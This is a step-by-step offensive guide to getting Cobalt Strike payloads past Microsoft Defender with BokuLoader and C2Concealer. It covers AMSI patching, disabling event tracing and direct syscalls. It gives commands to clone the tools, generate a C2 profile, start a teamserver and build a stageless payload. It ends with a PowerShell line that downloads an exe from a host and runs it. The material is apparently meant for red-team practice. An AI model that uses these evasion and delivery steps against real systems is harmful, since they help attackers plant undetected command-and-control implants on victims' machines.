---
description: quick guide to evading Defender (as of 26 May 202)
---

# Evading Defender with CobaltStrike

The following guide is based off of [BokuLoader](https://github.com/boku7/BokuLoader) and [C2Concealer](https://github.com/FortyNorthSecurity/C2concealer). BokuLoader utilizes [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) to perform direct syscalls, patches AmsiOpenSession to disable AMSI, and disables [windows event tracing](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/). For a more in depth guide on how Reflective DLLs work or how AMSI is disabled within this process I recommend [Sektor7s ](https://www.sektor7.net/#training)Malware Development and Windows Evasion courses or OffSec's [PEN-300](https://www.offensive-security.com/pen300-osep/) course. &#x20;

To start clone both github projects mentioned earlier

```
git clone https://github.com/boku7/BokuLoader
git clone https://github.com/FortyNorthSecurity/C2concealer
```

You'll want to run C2concealer's install script and update the _main_.py script with the location of your CobaltStrike folder. With that information updated and C2Concealer installed, its time to generate your own profile. Keep in mind you should follow FortyNorthSecurity's [guide](https://github.com/FortyNorthSecurity/C2concealer#customizing-the-tool) for customizing the tool to your Op.&#x20;

```
C2concealer --hostname test.com --variant 1
```

If the profile fails to generate, run the script a couple more times.&#x20;

Next start up your teamserver.&#x20;

```
./teamserver <IP> <password> <Path To C2concealer Generated Profile>
```

&#x20;Now it's time to update the artifact kit to set the stagesize to 412256. Update this in `build.sh` and `dist-template/artifact.cna`

![build.sh](<../../.gitbook/assets/image (180).png>)

![dist-template/artifact.cna](<../../.gitbook/assets/image (179).png>)

Now its time to load the `dist-template/artifact.cna` and `BokuLoader.cna` aggressor scripts in CobaltStrike.

Now generate your x64 stageless payload (Attacks -> Packages -> Windows Executable (S)). A successful payload generation should look something like this in your script console:&#x20;

![Successful generation](<../../.gitbook/assets/image (181).png>)

Now it's time to deliver the payload to the target, in this example we used hosted file to drop the payload on disk and run the exe. (Attacks -> Web Drive-by -> Host File)&#x20;

If you're just testing this, make sure to disable Tamper Protection, Automatic Sample Submission, and Cloud Delivered Protection.&#x20;

download and execute the payload in whatever manner you want, we choose to use powershell.&#x20;

```
 iwr -uri http://10.10.100.100/download/file.exe -outfile file.exe
 .\file.exe
```

![PROFIT](<../../.gitbook/assets/image (184).png>)
